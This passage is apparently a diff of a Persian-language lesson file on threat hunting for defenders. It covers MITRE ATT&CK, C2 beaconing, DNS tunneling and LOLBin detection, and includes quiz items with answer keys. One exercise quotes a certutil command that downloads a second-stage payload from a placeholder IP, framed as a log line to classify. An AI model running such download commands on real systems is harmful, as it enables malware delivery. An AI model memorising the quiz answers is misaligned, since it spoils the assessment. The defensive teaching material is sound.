-    "در Threat Hunting تیم منتظر آژیر SIEM نمی‌ماند، بلکه با ذهنیت Assume Breach و بر پایه فرضیه (Hypothesis) در داده‌های خام به دنبال TTPهای مهاجمان پنهان می‌گردد",
-    "Threat Hunting فقط روی فایروال انجام می‌شود",
-    "Threat Hunting نیازی به لاگ ندارد",
-    "پایش واکنشی سریع‌تر از صفر است"
-   ],
-   "correctIndex": 0,
-   "explanationHtml": "<p>شکار تهدید شکاف میان رخدادهای ناشناخته و قوانین موجود SIEM را پر می‌کند و خروجی آن قواعد تشخیص جدید است.</p>"
-  },
-  {
-   "title": "در هرم درد (Pyramid of Pain) دیوید بیانکو، شکار و مسدودسازی کدام لایه بیشترین هزینه و دردسر را به مهاجم تحمیل می‌کند؟",
-   "options": [
-    "هش فایل (MD5/SHA256)",
-    "آدرس IP سرور مهاجم",
-    "نام دامنه موقت",
-    "TTPs (تاکتیک‌ها، تکنیک‌ها و رویه‌های رفتاری مهاجم در قله هرم)"
-   ],
-   "correctIndex": 3,
-   "explanationHtml": "<p>تغییر هش یا IP برای مهاجم چند ثانیه طول می‌کشد، اما تغییر رفتار و TTPها کل ابزارسازی و عملیات مهاجم را بر هم می‌زند.</p>"
-  },
-  {
-   "title": "چگونه می‌توان ارتباط فرمان و کنترل (C2 Beaconing) یک بدافزار را حتی زمانی که ترافیک آن کاملاً با HTTPS رمزنگاری شده است، در لاگ‌های شبکه شناسایی کرد؟",
-   "options": [
-    "غیرممکن است و باید صبر کرد",
-    "با تحلیل آماری تناوب اتصال‌ها (فواصل منظم و نسبت جیتر بسیار پایین)، اثر انگشت TLS (JA3/JA4) و فراداده‌های Zeek/NetFlow",
-    "با خاموش کردن فایروال",
-    "با تغییر آدرس MAC کاربر"
-   ],
-   "correctIndex": 1,
-   "explanationHtml": "<p>فراداده زمانی و رفتاری (Low Jitter Ratio) یکی از قوی‌ترین سیگنال‌های کشف C2 Beaconing روی ترافیک رمزنگاری‌شده است.</p>"
-  },
-  {
-   "title": "منظور از تکنیک LOLBins (Living off the Land Binaries) که مهاجمان پیشرفته برای گریز از آنتی‌ویروس به کار می‌برند چیست؟",
-   "options": [
-    "نوشتن سیستم‌عامل جدید",
-    "حمله فیزیکی به سرور",
-    "سوءاستفاده از ابزارهای مشروع و امضاشده خود سیستم‌عامل (مانند PowerShell، certutil، mshta و WMI) برای دانلود یا اجرای کد مخرب",
-    "خاموش کردن کابل شبکه"
-   ],
-   "correctIndex": 2,
-   "explanationHtml": "<p>چون این فایل‌ها مشروع و متعلق به ویندوز هستند، آنتی‌ویروس مبتنی بر هش فایل آن‌ها را نمی‌گیرد و باید خط فرمان و درخت فرآیند را شکار کرد.</p>"
-  },
-  {
-   "title": "مشاهده اجرای فرآیند powershell.exe با پارامتر -EncodedCommand به عنوان فرزند مستقیم winword.exe در لاگ Sysmon Event ID 1 نشانه قوی چیست؟",
-   "options": [
-    "اجرای احتمالی ماکرو یا اکسپلویت مخرب درون سند Word (تکنیک MITRE ATT&CK T1059.001)",
-    "به‌روزرسانی عادی فونت ویندوز",
-    "اتصال طبیعی به چاپگر",
-    "تنظیم ساعت NTP"
-   ],
-   "correctIndex": 0,
-   "explanationHtml": "<p>رابطه غیرطبیعی والد-فرزند میان نرم‌افزارهای Office و مفسرهای خط فرمان یکی از طلایی‌ترین فرضیه‌های شکار تهدید است.</p>"
-  },
-  {
-   "title": "هدف گام چهارم چرخه Threat Hunting (تبدیل یک شکار موفق به قوانین Sigma / YARA و Playbookهای SIEM) چیست؟",
-   "options": [
-    "حذف کل تیم SOC",
-    "اتوماسیون کشف آن الگوی تهدید برای آینده (Detection Engineering) تا SIEM آن را فوری تشخیص دهد و شکارچی به سراغ فرضیه‌های جدید برود",
-    "ذخیره لاگ‌ها در فایل اکسل دستی",
-    "افزایش تعداد هشدارهای کاذب"
-   ],
-   "correctIndex": 1,
-   "explanationHtml": "<p>ارزش پایدار Threat Hunting در تبدیل دانش انسانی شکار به قواعد خودکار Sigma/YARA و ارتقای بلوغ SIEM است.</p>"
-  },
-  {
-   "title": "تکنیک آماری Long-Tail Analysis (Stacking) در شکار تهدید چگونه به کشف نفوذ در میان میلیون‌ها لاگ کمک می‌کند؟",
-   "options": [
-    "با حذف همه لاگ‌های سرور",
-    "با انتخاب پرتکرارترین فرآیندها",
-    "با گروه‌بندی و شمارش فراوانی رویدادها و تمرکز بر کم‌تکرارترین و غیرعادی‌ترین موارد (Outliers) که معمولاً فعالیت مهاجم در میان آن‌ها پنهان است",
-    "با مسدود کردن همه کاربران"
-   ],
-   "correctIndex": 2,
-   "explanationHtml": "<p>ترافیک عادی و اسکریپت‌های مدیریتی پرتکرارند؛ ابزار یا مسیر غیرعادی مهاجم معمولاً در دم بلند (کم‌تکرار) نمودار فراوانی ظاهر می‌شود.</p>"
-  },
-  {
-   "title": "کدام نشانه در لاگ‌های DNS (مانند Zeek dns.log) به شدت مشکوک به خروج مخفیانه داده از طریق DNS Tunneling است؟",
-   "options": [
-    "یک درخواست عادی برای google.com",
-    "پاسخ سریع از کش محلی",
-    "حذف پورت TCP 80",
-    "حجم غیرعادی درخواست‌های TXT/AAAA با زیردامنه‌های بسیار طولانی و آنتروپی بالا (رشته‌های تصادفی کدگذاری‌شده) به سمت یک دامنه ناشناس"
-   ],
-   "correctIndex": 3,
-   "explanationHtml": "<p>کدگذاری داده (Base32/Hex) درون برچسب‌های زیردامنه باعث افزایش شدید طول و آنتروپی نام‌های DNS می‌شود.</p>"
-  },
-  {
-   "title": "چرا یک عملیات شکار تهدید که هیچ مهاجم فعالی پیدا نکرده است، همچنان برای امنیت سازمان ارزشمند محسوب می‌شود؟",
-   "options": [
-    "زیرا شکاف‌های دید (Visibility Gaps مانند نبود Sysmon) را آشکار می‌کند، خط مبنا (Baseline) فعالیت عادی را می‌سازد و کیفیت لاگ‌ها را ارتقا می‌دهد",
-    "ارزشی ندارد و شکست محسوب می‌شود",
-    "باعث کاهش تعداد سرورها می‌شود",
-    "موجب حذف نیاز به بکاپ می‌شود"
-   ],
-   "correctIndex": 0,
-   "explanationHtml": "<p>کشف اینکه «اگر فردا مهاجمی از تکنیک X استفاده کند، ما اصلاً لاگ آن را نداریم» یکی از مهم‌ترین دستاوردهای Threat Hunting است.</p>"
-  },
-  {
-   "title": "در ماتریس MITRE ATT&CK، اجرای دستور certutil.exe -urlcache -split -f برای دانلود فایل مرحله دوم بدافزار از اینترنت به کدام تکنیک نگاشت می‌شود؟",
-   "options": [
-    "T1486 (Data Encrypted for Impact)",
-    "T1105 (Ingress Tool Transfer)",
-    "T1078 (Valid Accounts)",
-    "T1498 (Network Denial of Service)"
-   ],
-   "correctIndex": 1,
-   "explanationHtml": "<p>انتقال ابزار یا بدافزار مرحله بعدی از بیرون به داخل سیستم قربانی دقیقاً تکنیک <code>T1105</code> در تاکتیک Command and Control است.</p>"
-  },
-  {
-   "title": "نقش ابزار متن‌باز Zeek در زیرساخت شکار تهدید شبکه چیست؟",
-   "options": [
-    "پخش فایل‌های ویدیویی",
-    "رمزگشایی رمز عبور کاربران",
-    "تولید فراداده‌های ساختاریافته و غنی از ترافیک شبکه (conn، dns، http، ssl) با حجم بسیار کمتر از Full PCAP جهت تحلیل سریع شکارچیان",
-    "جایگزینی آنتی‌ویروس روی ویندوز"
-   ],
-   "correctIndex": 2,
-   "explanationHtml": "<p>Zeek پل میانی فوق‌العاده میان NetFlow ساده و PCAP سنگین است و منبع اصلی شکار در سطح شبکه محسوب می‌شود.</p>"
-  },
-  {
-   "title": "آزمایشگاه این درس چگونه اجرا شده است؟",
-   "options": [
-    "اجرای بدافزار Cobalt Strike روی شبکه زنده",
-    "اتصال به Splunk تولیدی سازمان",
-    "فقط متن نظری بدون کد",
-    "شبیه‌سازی محلی (Local Mock) در Python 3 روی تله‌متری مصنوعی برای تحلیل جیتر C2 Beaconing و شکار PowerShell/certutil LOLBins با نگاشت MITRE ATT&CK"
-   ],
-   "correctIndex": 3,
-   "explanationHtml": "<p>آزمایشگاه به‌صورت Local Mock در Python 3 روی داده‌های مصنوعی اجرا شده و هیچ SIEM یا بدافزار واقعی در آن نیست.</p>"
-  }
- ],
- "meta": {
-  "version": "reviewed.5",
-  "legacyId": "spec_cyber_hunt",
-  "sources": [
-   "https://attack.mitre.org/",
-   "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon"
+  "schema": "fam-app-blueprint-v1",
+  "lessonId": "spec_cyber_hunt",
+  "objectiveId": "spec_cyber_hunt",
+  "kind": "lesson",
+  "track": "Specialist",
+  "course": "spec-cyberops",
+  "title": "۷.۷ CyberOps: شکار پیش‌فعال تهدید (Threat Hunting)، ماتریس MITRE ATT&CK، تله‌متری و شکار LOLBins",
+  "titleEn": "CyberOps Deep Dive: Proactive Threat Hunting, MITRE ATT&CK, Pyramid of Pain, C2 Beaconing & LOLBins",
+  "domain": "Cybersecurity Operations",
+  "source": "Legacy spec_cyber_hunt rewritten, fully typo-cleaned, and audited",
+  "evidence": "Designed — Not Run",
+  "reviewStatus": "بازبینی معنایی توسط نویسنده انجام شده؛ بازبینی مستقل انجام نشده است",
+  "estimatedMinutes": 55,
+  "prerequisites": [
+    "spec_cyber"
   ],
-  "limitations": [
-   "آزمایشگاه این درس یک Local Mock در Python 3 روی تله‌متری مصنوعی است و هیچ SIEM/EDR واقعی، حسگر Zeek یا بدافزار زنده‌ای متصل یا اجرا نشده است."
+  "sections": [
+    {
+      "id": "spec_cyber_hunt-section-1",
+      "title": "مسئله واقعی: اگر هیچ هشداری در SIEM روشن نشده، آیا واقعاً امن هستید؟",
+      "html": "<p>مهاجمان پیشرفته (APT) و گروه‌های باج‌افزاری مدرن دیگر فایل‌های مخرب ساده با هش شناخته‌شده روی دیسک نمی‌ریزند تا آنتی‌ویروس یا SIEM آژیر بکشد! آن‌ها هفته‌ها بی‌سروصدا با ابزارهای مشروع خود ویندوز و لینوکس (<strong>LOLBins</strong> مثل PowerShell، WMI و Certutil) درون شبکه حرکت جانبی (Lateral Movement) می‌کنند. <strong>شکار تهدید (Proactive Threat Hunting)</strong> یعنی منتظر هشدار نمانیم: با ذهنیت <strong>«فرض کن نفوذ رخ داده (Assume Breach)»</strong> و بر پایه فرضیه (Hypothesis)، در دل لاگ‌های Endpoint و شبکه به دنبال ردپای رفتارهای مهاجم (TTPs) بگردیم!</p>"
+    },
+    {
+      "id": "spec_cyber_hunt-section-2",
+      "title": "هدف یادگیری و پیش‌نیازها",
+      "html": "<p><strong>پیش‌نیازها:</strong> مبانی SOC، SIEM، تحلیل لاگ و پاسخ به رخداد در درس <code>spec_cyber</code>.</p><ul><li>اجرای چرخه ۴مرحله‌ای <strong>Hypothesis-Driven Threat Hunting</strong> و تبدیل یافته‌های شکار به قوانین پایدار <strong>Sigma / YARA / SIEM</strong>.</li><li>به‌کارگیری <strong>هرم درد (Pyramid of Pain)</strong> و ماتریس <strong>MITRE ATT&amp;CK</strong> برای هدف‌گیری <strong>TTPs</strong> به جای وابستگی صرف به هش و IP.</li><li>شناسایی تکنیک‌های پنهان‌کاری مهاجمان: <strong>C2 Beaconing</strong> (فواصل زمانی منظم کم‌جیتر در شبکه)، <strong>DNS Tunneling</strong> و <strong>LOLBins</strong> (PowerShell کدگذاری‌شده، <code>certutil</code>، <code>mshta</code>).</li><li>ترکیب تله‌متری شبکه (<strong>Zeek / NetFlow / DNS</strong>) با تله‌متری میزبان (<strong>Sysmon / EDR Process Tree</strong>) و مهار هشدارهای کاذب (False Positives).</li></ul>"
+    },
+    {
+      "id": "spec_cyber_hunt-section-3",
+      "title": "تفاوت پایش واکنشی (Alert Triage) با شکار پیش‌فعال تهدید (Proactive Hunting)",
+      "html": "<table><thead><tr><th>ویژگی</th><th>پایش واکنشی SOC (Tier 1/2 Alerting)</th><th>شکار پیش‌فعال تهدید (Threat Hunting)</th></tr></thead><tbody><tr><td>نقطه شروع</td><td>یک هشدار (Alert) از SIEM/EDR/IDS</td><td><strong>فرضیه (Hypothesis)</strong> مبتنی بر تهدیدات روز و ATT&amp;CK</td></tr><tr><td>ابزار تمرکز</td><td>قوانین موجود و IOCهای شناخته‌شده</td><td>کاوش داده‌های خام (Sysmon، Zeek، NetFlow، DNS) و تحلیل آماری</td></tr><tr><td>خروجی نهایی</td><td>بستن یا ارجاع یک تیکت رخداد</td><td>کشف نفوذ ناشناخته + <strong>ساخت قاعده تشخیص خودکار جدید (Detection Engineering)</strong> + رفع شکاف دید (Visibility Gap)</td></tr></tbody></table>"
+    },
+    {
+      "id": "spec_cyber_hunt-section-4",
+      "title": "نمودار چرخه شکار پیش‌فعال تهدید و هرم درد (Pyramid of Pain)",
+      "html": "<p>نمودار زیر چهار گام چرخه Threat Hunting و جایگاه TTPها در قله هرم درد دیوید بیانکو را نشان می‌دهد.</p><svg viewBox=\"0 0 760 225\" xmlns=\"http://www.w3.org/2000/svg\" role=\"img\" aria-label=\"Proactive Threat Hunting Loop: Hypothesis, MITRE ATT&amp;CK, Telemetry (Sysmon/Zeek/EDR), Beaconing &amp; Detection Engineering\"><rect x=\"14\" y=\"16\" width=\"170\" height=\"106\" rx=\"10\" fill=\"#eff6ff\" stroke=\"#1d4ed8\" stroke-width=\"2\"/><text x=\"99\" y=\"38\" text-anchor=\"middle\" font-size=\"11\" font-weight=\"bold\" fill=\"#1e3a8a\">1. Hypothesis</text><text x=\"99\" y=\"60\" text-anchor=\"middle\" font-size=\"9\" fill=\"#0f172a\">Assume Breach Mindset</text><text x=\"99\" y=\"78\" text-anchor=\"middle\" font-size=\"9\" fill=\"#1e40af\">MITRE ATT&amp;CK TTPs</text><text x=\"99\" y=\"96\" text-anchor=\"middle\" font-size=\"9\" fill=\"#1e40af\">e.g. T1059.001 / T1071</text><rect x=\"200\" y=\"16\" width=\"174\" height=\"106\" rx=\"10\" fill=\"#fef3c7\" stroke=\"#d97706\" stroke-width=\"2\"/><text x=\"287\" y=\"38\" text-anchor=\"middle\" font-size=\"11\" font-weight=\"bold\" fill=\"#92400e\">2. Telemetry Hunt</text><text x=\"287\" y=\"60\" text-anchor=\"middle\" font-size=\"9\" fill=\"#78350f\">Sysmon / EDR Process Tree</text><text x=\"287\" y=\"78\" text-anchor=\"middle\" font-size=\"9\" fill=\"#b45309\">Zeek / NetFlow / DNS Logs</text><text x=\"287\" y=\"96\" text-anchor=\"middle\" font-size=\"9\" fill=\"#78350f\">C2 Beaconing &amp; LOLBins</text><rect x=\"390\" y=\"16\" width=\"172\" height=\"106\" rx=\"10\" fill=\"#fee2e2\" stroke=\"#b91c1c\" stroke-width=\"2\"/><text x=\"476\" y=\"38\" text-anchor=\"middle\" font-size=\"11\" font-weight=\"bold\" fill=\"#991b1b\">3. Uncover &amp; Triage</text><text x=\"476\" y=\"60\" text-anchor=\"middle\" font-size=\"9\" fill=\"#7f1d1d\">Low-Jitter C2 Pattern</text><text x=\"476\" y=\"78\" text-anchor=\"middle\" font-size=\"9\" fill=\"#991b1b\">Encoded PowerShell / Certutil</text><text x=\"476\" y=\"96\" text-anchor=\"middle\" font-size=\"9\" fill=\"#7f1d1d\">Filter Benign Admin Noise</text><rect x=\"578\" y=\"16\" width=\"168\" height=\"106\" rx=\"10\" fill=\"#dcfce7\" stroke=\"#15803d\" stroke-width=\"2\"/><text x=\"662\" y=\"38\" text-anchor=\"middle\" font-size=\"11\" font-weight=\"bold\" fill=\"#166534\">4. Automate Rule</text><text x=\"662\" y=\"60\" text-anchor=\"middle\" font-size=\"9\" fill=\"#14532d\">Convert Hunt -&gt; Sigma/YARA</text><text x=\"662\" y=\"78\" text-anchor=\"middle\" font-size=\"9\" fill=\"#166534\">Feed SIEM &amp; SOAR Playbook</text><text x=\"662\" y=\"96\" text-anchor=\"middle\" font-size=\"9\" fill=\"#14532d\">Close Visibility Gaps!</text><rect x=\"14\" y=\"144\" width=\"732\" height=\"64\" rx=\"10\" fill=\"#f8fafc\" stroke=\"#475569\" stroke-width=\"2\"/><text x=\"380\" y=\"168\" text-anchor=\"middle\" font-size=\"11\" font-weight=\"bold\" fill=\"#0f172a\">Pyramid of Pain: Hashes/IPs (Trivial to Change) &lt; Domains &lt; Tools &lt; TTPs (Tough for Attackers!)</text><text x=\"380\" y=\"188\" text-anchor=\"middle\" font-size=\"9\" fill=\"#334155\">Mature Threat Hunters Hunt Top-of-Pyramid TTPs (MITRE ATT&amp;CK), Not Only Yesterday&apos;s MD5 Hashes!</text></svg>"
+    },
+    {
+      "id": "spec_cyber_hunt-section-5",
+      "title": "هرم درد (Pyramid of Pain) و ماتریس MITRE ATT&CK: چرا شکارچی حرفه‌ای بالای هرم شکار می‌کند؟",
+      "html": "<p>در <strong>هرم درد (David Bianco)</strong>، اگر مدافع فقط یک <strong>Hash</strong> (پایین هرم) یا <strong>آدرس IP</strong> را مسدود کند، مهاجم ظرف ۱۰ ثانیه فایل را با یک بایت اضافه تغییر می‌دهد یا سرور ابری جدید می‌گیرد! اما اگر مدافع رفتار و تکنیک مهاجم (<strong>TTPs — قله هرم</strong>) مانند «اجرای PowerShell مخفی از زیرشاخه <code>winword.exe</code>» یا «استفاده از <code>certutil -urlcache</code> برای دانلود فایل» را بر اساس کدهای <strong>MITRE ATT&amp;CK</strong> (مثل <code>T1059.001</code> و <code>T1105</code>) شکار کند، مهاجم مجبور به بازنویسی کل روش عملیات خود می‌شود!</p>"
+    },
+    {
+      "id": "spec_cyber_hunt-section-6",
+      "title": "شکار در تله‌متری شبکه: کشف C2 Beaconing، آنتروپی DNS و تحلیل Zeek/NetFlow",
+      "html": "<ul><li><strong>C2 Beaconing (تپش فرمان و کنترل):</strong> بدافزارها (مثل Cobalt Strike یا Sliver) در بازه‌های منظم (مثلاً هر ۶۰ ثانیه با کمی Jitter تصادفی) به سرور C2 سر می‌زنند. تحلیل آماری فاصله زمانی اتصال‌ها (میانگین و نسبت انحراف معیار به میانگین — <strong>Low Jitter Ratio</strong>) روی لاگ‌های Proxy، NetFlow یا <strong>Zeek (<code>conn.log / http.log / tls.log</code>)</strong> حتی زمانی که ترافیک با HTTPS رمزنگاری شده، الگوی Beaconing را افشا می‌کند!</li><li><strong>DNS Tunneling و DGA:</strong> زیردامنه‌های بسیار طولانی با آنتروپی (تصادفی بودن حروف) بالا و حجم غیرعادی درخواست‌های <code>TXT / AAAA</code> به یک دامنه تازه ثبت‌شده، نشانه کلاسیک خروج داده (Exfiltration) از طریق DNS است.</li></ul>"
+    },
+    {
+      "id": "spec_cyber_hunt-section-7",
+      "title": "شکار در تله‌متری میزبان: Sysmon، درخت فرآیندها (Parent-Child) و LOLBins",
+      "html": "<p>در ویندوز، لاگ‌های پیش‌فرض اغلب برای شکار کافی نیستند؛ فعال‌سازی <strong>Microsoft Sysmon</strong> (به ویژه رویداد <code>Event ID 1: Process Creation</code> با خط فرمان کامل، <code>Event ID 3: Network Connection</code> و <code>Event ID 11: FileCreate</code>) همراه با <strong>PowerShell Script Block Logging (4104)</strong> دید فوق‌العاده‌ای می‌دهد. دو الگوی طلایی شکار:</p><ul><li><strong>روابط غیرطبیعی والد-فرزند (Parent-Child Process Anomaly):</strong> چرا باید <code>winword.exe</code> یا <code>excel.exe</code> فرآیند <code>cmd.exe</code> یا <code>powershell.exe -EncodedCommand</code> را باز کند؟! یا چرا باید <code>w3wp.exe</code> (وب‌سرور IIS) دستور <code>whoami</code> اجرا کند (نشانه Web Shell)!</li><li><strong>سوءاستفاده از LOLBins (Living off the Land Binaries):</strong> استفاده مهاجم از ابزارهای مشروع و امضاشده خود ویندوز مانند <code>certutil.exe -urlcache -f</code>، <code>bitsadmin</code>، <code>mshta</code> یا <code>rundll32</code> برای دور زدن فهرست سفید نرم‌افزارها.</li></ul>"
+    },
+    {
+      "id": "spec_cyber_hunt-section-8",
+      "title": "تبدیل شکار موفق به مهندسی تشخیص پایدار: Sigma، YARA و Playbookهای SOAR",
+      "html": "<p>اگر یک شکارچی هفته‌ای یک بار همان کوئری را دستی اجرا کند، شکار مقیاس نمی‌گیرد! گام چهارم و طلایی چرخه شکار، <strong>تبدیل فرضیه موفق به قاعده تشخیص خودکار (Detection Engineering)</strong> است: نوشتن قانون عمومی لاگ با قالب باز <strong>Sigma</strong> (قابل تبدیل به Splunk، Elastic، Sentinel)، نوشتن امضای فایل/حافظه با <strong>YARA</strong> و اتصال آن به Playbook قرنطینه خودکار <strong>SOAR / ISE ANC</strong> تا دفعه بعد SIEM آن را در ثانیه اول شکار کند و شکارچی به سراغ فرضیه جدیدتر برود!</p>"
+    },
+    {
+      "id": "spec_cyber_hunt-section-9",
+      "title": "مهار هشدارهای کاذب (False Positives) و شناخت Baseline عادی سازمان",
+      "html": "<p>بزرگ‌ترین قاتل موفقیت تیم شکار، ندانستن رفتار عادی (<strong>Baseline</strong>) سازمان است! بسیاری از ابزارهای مدیریت سیستم (SCCM، Ansible، اسکریپت‌های بکاپ <code>robocopy</code> یا مانیتورینگ) نیز اتصال‌های منظم یا اسکریپت‌های PowerShell اجرا می‌کنند. شکارچی حرفه‌ای با روش <strong>Stacking (شمارش فراوانی و بررسی کم‌تکرارترین موارد — Long-Tail Analysis)</strong> موارد نادر و مشکوک را از نویز عادی مدیران جدا می‌کند.</p>"
+    },
+    {
+      "id": "spec_cyber_hunt-section-10",
+      "title": "تفاوت‌های کلیدی Cyber Kill Chain، مدل Diamond و ماتریس MITRE ATT&CK",
+      "html": "<p>هر سه چارچوب مکمل هم‌اند: <strong>Cyber Kill Chain</strong> مراحل خطی حمله بیرونی (از Reconnaissance تا Actions on Objectives) را نشان می‌دهد، <strong>Diamond Model</strong> رابطه میان مهاجم، زیرساخت، قابلیت و قربانی را تحلیل می‌کند، و <strong>MITRE ATT&amp;CK</strong> دانشنامه عمیق و جزئی رفتارهای پس از نفوذ (Post-Exploitation) در قالب ۱۴ تاکتیک و صدها تکنیک و زیرتکنیک است که زبان مشترک تیم‌های Threat Hunting و Red/Blue Team محسوب می‌شود.</p>"
+    },
+    {
+      "id": "spec_cyber_hunt-section-11",
+      "title": "کژفهمی‌های رایج درباره Threat Hunting",
+      "html": "<ul><li><strong>کژفهمی ۱: «اگر شکار تمام شد و هیچ بدافزاری پیدا نکردیم، پس شکار شکست خورده است!»</strong> واقعیت: خیر! یک شکار بدون کشف نفوذ اغلب شکاف‌های لاگ‌برداری (Visibility Gaps — مثلاً خاموش بودن Sysmon روی سرورهای حیاتی) را کشف می‌کند، Baseline سازمان را می‌سازد و برای کل تیم قاعده جدید تولید می‌کند.</li><li><strong>کژفهمی ۲: «جست‌وجوی فهرست ۱۰۰ آدرس IP مخرب در SIEM همان Threat Hunting پیشرفته است.»</strong> واقعیت: جست‌وجوی ساده IOCها (پایین هرم درد) باید کاملاً خودکار در SIEM انجام شود؛ Threat Hunting واقعی مبتنی بر فرضیه و شکار رفتارها/TTPهاست.</li><li><strong>کژفهمی ۳: «چون ترافیک C2 با HTTPS رمزنگاری شده، از شبکه هیچ کاری نمی‌شود کرد.»</strong> واقعیت: حتی بدون شکستن TLS، فراداده‌هایی مانند الگوی زمانی Beaconing، اثر انگشت TLS (JA3/JA4)، نام دامنه SNI، گواهینامه Self-Signed و نسبت حجم ارسال/دریافت، C2 را لو می‌دهند!</li></ul>"
+    },
+    {
+      "id": "spec_cyber_hunt-section-12",
+      "title": "اصلاح اشتباهات نگارشی نسخه قدیمی و چک‌لیست اجرای شکار سالم",
+      "html": "<p><strong>یادداشت ممیزی کیفیت محتوا:</strong> در نسخه قدیمی این درس چندین عبارت به هم ریخته و نادرست تایپی وجود داشت که در این نسخه به‌طور کامل بازنویسی و با اصطلاحات دقیق بین‌المللی (<code>MITRE ATT&amp;CK</code>، <code>C2 Beaconing</code>، <code>LOLBins</code>، <code>Sysmon</code>، <code>Zeek</code> و <code>Sigma/YARA</code>) جایگزین شده‌اند.</p><p><strong>چک‌لیست شروع یک شکار:</strong> (۱) نوشتن فرضیه دقیق با شناسه ATT&amp;CK، (۲) تأیید موجود بودن تله‌متری لازم (Sysmon/Zeek/DNS)، (۳) اجرای تحلیل Stacking / Jitter، (۴) مستندسازی یافته‌ها و تبدیل به قانون Sigma.</p>"
+    },
+    {
+      "id": "spec_cyber_hunt-section-13",
+      "title": "تمرین تحلیلی با پاسخ تشریحی",
+      "html": "<p><strong>تمرین ۱:</strong> ایستگاه کاری <code>10.10.40.19</code> هر ۶۰ ثانیه (با فواصل ۵۸ تا ۶۲ ثانیه، نسبت جیتر <code>0.022</code>) به یک سرور خارجی متصل می‌شود، در حالی که کاربر <code>10.10.40.22</code> فواصل کاملاً نامنظم (۱۴ تا ۴۷۵ ثانیه، جیتر <code>1.07</code>) دارد. کدام مورد مشکوک به C2 Beaconing است؟ <strong>پاسخ:</strong> ایستگاه <code>10.10.40.19</code> به دلیل تناوب شدید و جیتر بسیار پایین، نامزد قوی شکار برای <code>MITRE ATT&amp;CK T1071 (C2 Beaconing)</code> است.</p><p><strong>تمرین ۲:</strong> در لاگ Sysmon روی یک ایستگاه مالی دستور <code>certutil.exe -urlcache -split -f http://198.51.100.77/stage2.bin</code> دیده شده است. این رفتار به چه تکنیکی تعلق دارد؟ <strong>پاسخ:</strong> سوءاستفاده از ابزار مشروع ویندوز (<strong>LOLBin</strong>) برای دانلود ابزار مهاجم؛ مطابق با <strong><code>MITRE ATT&amp;CK T1105 (Ingress Tool Transfer)</code></strong>.</p>"
+    },
+    {
+      "id": "spec_cyber_hunt-section-14",
+      "title": "منابع فنی، محدودیت‌ها و مرز اجرا",
+      "html": "<p><strong>منابع مرجع:</strong> <a href=\"https://attack.mitre.org/\" target=\"_blank\" rel=\"noopener\">ماتریس رسمی MITRE ATT&amp;CK</a> و <a href=\"https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon\" target=\"_blank\" rel=\"noopener\">مستندات رسمی Microsoft Sysmon</a>.</p><p><strong>محدودیت‌ها و مرز اجرا:</strong> آزمایشگاه این درس یک Local Mock در Python 3 روی تله‌متری مصنوعی است و هیچ SIEM/EDR واقعی، حسگر Zeek یا بدافزار زنده‌ای در این محیط اجرا نشده است.</p>"
+    }
   ],
-  "legacyAuditFixes": [
-   "اصلاح کامل غلط‌های املایی و به هم‌ریختگی‌های شدید نسخه قدیمی («تلgern»، «شوائع»، «تراک broadcast» و «diagnostic می‌شود») و بازنویسی کامل به ۱۴ بخش، ۱۵ واژه، ۱۲ پرسش، نمودار SVG، Pyramid of Pain، MITRE ATT&CK، Sigma/YARA و شبیه‌ساز C2 Beaconing/LOLBins."
+  "glossary": [
+    {
+      "term": "Threat Hunting",
+      "fa": "شکار پیش‌فعال تهدید",
+      "simple": "جست‌وجوی هدفمند و فرضیه‌محور در لاگ‌ها و تله‌متری شبکه برای کشف مهاجمانی که از لایه‌های هشدار عبور کرده‌اند."
+    },
+    {
+      "term": "Assume Breach",
+      "fa": "ذهنیت فرض وقوع نفوذ",
+      "simple": "اصل بنیادین شکار تهدید مبنی بر اینکه نباید نبود هشدار را مساوی با نبود مهاجم دانست."
+    },
+    {
+      "term": "MITRE ATT&CK",
+      "fa": "ماتریس تاکتیک‌ها و تکنیک‌های مهاجمان",
+      "simple": "پایگاه دانش جهانی رفتارهای واقعی مهاجمان (تاکتیک‌ها، تکنیک‌ها و زیرتکنیک‌ها)."
+    },
+    {
+      "term": "Pyramid of Pain",
+      "fa": "هرم درد دیوید بیانکو",
+      "simple": "رتبه‌بندی دشواری تغییر شاخص‌ها برای مهاجم: از هش و IP (آسان) تا TTPها در قله (بسیار دشوار)."
+    },
+    {
+      "term": "TTPs",
+      "fa": "تاکتیک‌ها، تکنیک‌ها و رویه‌ها",
+      "simple": "الگوهای رفتاری مهاجم (بالای هرم درد)؛ پایدارترین و ارزشمندترین هدف برای شکار و تشخیص."
+    },
+    {
+      "term": "C2 Beaconing",
+      "fa": "تپش ارتباط فرمان و کنترل",
+      "simple": "اتصال‌های دوره‌ای و کم‌جیتر بدافزار به سرور فرمان‌دهی مهاجم (قابل کشف با تحلیل آماری فواصل)."
+    },
+    {
+      "term": "LOLBins",
+      "fa": "ابزارهای مشروع مورد سوءاستفاده",
+      "simple": "Living off the Land Binaries؛ ابزارهای امضاشده خود سیستم‌عامل (PowerShell، certutil، mshta) که مهاجم به کار می‌برد."
+    },
+    {
+      "term": "Microsoft Sysmon",
+      "fa": "مانیتور پیشرفته رویداد ویندوز",
+      "simple": "سرویس رایگان مایکروسافت برای ثبت دقیق ساخت فرآیند با خط فرمان (EID 1)، اتصال شبکه (EID 3) و فایل‌ها."
+    },
+    {
+      "term": "Zeek (Bro)",
+      "fa": "تحلیلگر فراداده شبکه",
+      "simple": "موتور متن‌باز تولید لاگ‌های غنی شبکه (conn، dns، http، tls) برای شکار تهدید بدون ذخیره تمام PCAP."
+    },
+    {
+      "term": "Sigma Rules",
+      "fa": "قالب استاندارد قوانین SIEM",
+      "simple": "زبان متنی YAML مستقل از فروشنده برای نوشتن قوانین تشخیص لاگ و تبدیل آن به Splunk/Elastic/Sentinel."
+    },
+    {
+      "term": "YARA",
+      "fa": "زبان امضای فایل و حافظه",
+      "simple": "استاندارد شناسایی الگوهای باینری یا متنی خانواده‌های بدافزار روی دیسک و رم."
+    },
+    {
+      "term": "Long-Tail Stacking",
+      "fa": "تحلیل فراوانی کم‌تکرارها",
+      "simple": "تکنیک آماری شکار برای یافتن فرآیندها یا دامنه‌های نادر (Outliers) در میان حجم انبوه فعالیت عادی."
+    },
+    {
+      "term": "DNS Tunneling",
+      "fa": "تونل‌زنی روی DNS",
+      "simple": "خروج مخفیانه داده یا ارتباط C2 درون زیردامنه‌های طولانی و پرآنتروپی DNS."
+    },
+    {
+      "term": "Visibility Gap",
+      "fa": "شکاف دید تله‌متری",
